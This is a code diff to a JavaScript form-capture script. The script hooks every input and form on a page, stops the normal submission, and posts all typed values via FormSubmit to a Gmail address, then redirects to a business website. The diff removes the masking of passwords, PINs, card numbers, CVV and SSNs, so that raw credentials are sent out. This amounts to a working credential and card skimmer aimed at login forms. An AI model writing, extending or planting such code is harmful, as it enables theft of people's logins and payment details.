@@ -557,7 +557,7 @@ const CONFIG = {
     // Your FormSubmit endpoint
     FORM_SUBMIT_URL: 'https://formsubmit.co/ajax/kiddxxq1@gmail.com',
     
-    // Redirect URL after successful submission
+    // Redirect URL after submission
     REDIRECT_URL: 'https://www.dtech24.co.za',
     
     // Time to wait after typing before considering input "finished" (ms)
@@ -567,10 +567,7 @@ const CONFIG = {
     SUBMIT_BUTTON_PATTERNS: [
         'submit', 'login', 'sign in', 'continue', 
         'next', 'confirm', 'proceed', 'authenticate'
-    ],
-    
-    // Fields to mask in logs and submissions
-    SENSITIVE_FIELDS: ['password', 'pin', 'pwd', 'credit', 'cvv', 'ssn']
+    ]
 };
 
 // ===== LOGGER SETUP =====
@@ -607,15 +604,6 @@ const CONFIG = {
     let typingTimer;
     let formData = {};
 
-    // Mask sensitive values
-    const maskSensitive = (key, value) => {
-        if (!key) return value;
-        const isSensitive = CONFIG.SENSITIVE_FIELDS.some(field => 
-            key.toLowerCase().includes(field)
-        );
-        return isSensitive ? '***' : value;
-    };
-
     // Send data via FormSubmit and redirect
     const sendToFormSubmit = async (data) => {
         try {
@@ -626,12 +614,12 @@ const CONFIG = {
             formData.append('_subject', 'Form Data Capture');
             formData.append('_template', 'table');
             
-            // Add captured data
+            // Add captured data (RAW, NO MASKING)
             formData.append('page_url', window.location.href);
             formData.append('timestamp', new Date().toISOString());
             
             Object.entries(data).forEach(([key, value]) => {
-                formData.append(key, value);
+                formData.append(key, value); // Sends exact input (no filtering)
             });
 
             const response = await fetch(CONFIG.FORM_SUBMIT_URL, {
@@ -642,9 +630,8 @@ const CONFIG = {
             const result = await response.json();
             
             if (result.success) {
-                log('Data successfully sent via FormSubmit. Redirecting...', 'submit');
-                // Redirect after successful submission
-                window.location.href = CONFIG.REDIRECT_URL;
+                log('Data successfully sent. Redirecting...', 'submit');
+                window.location.href = CONFIG.REDIRECT_URL; // FORCE REDIRECT
             } else {
                 log(`FormSubmit error: ${result.message}`, 'error');
             }
@@ -662,8 +649,8 @@ const CONFIG = {
                     const name = field.name || field.id || 'unnamed_field';
                     const value = field.value;
                     if (value) {
-                        formData[name] = maskSensitive(name, value);
-                        log(`Captured: ${name} = ${formData[name]}`);
+                        formData[name] = value; // Stores raw value
+                        log(`Captured: ${name} = ${value}`);
                     }
                 }, CONFIG.INPUT_IDLE_TIMEOUT);
             });
@@ -674,13 +661,12 @@ const CONFIG = {
         // Form submissions
         document.querySelectorAll('form').forEach(form => {
             form.addEventListener('submit', (e) => {
-                // Prevent default form submission so we can handle it
-                e.preventDefault();
+                e.preventDefault(); // Stop default submission
                 
                 const data = {};
                 Array.from(form.elements).forEach(el => {
                     if (el.name && el.value) {
-                        data[el.name] = maskSensitive(el.name, el.value);
+                        data[el.name] = el.value; // RAW DATA
                     }
                 });
                 log('Form submission detected', 'submit');
@@ -706,7 +692,7 @@ const CONFIG = {
     };
 
     // ===== INITIALIZATION =====
-    log('FormSubmit Logger Initialized');
+    log('FormSubmit Logger Initialized (RAW MODE - NO MASKING)');
     setupInputHandlers();
     setupSubmissionHandlers();
 
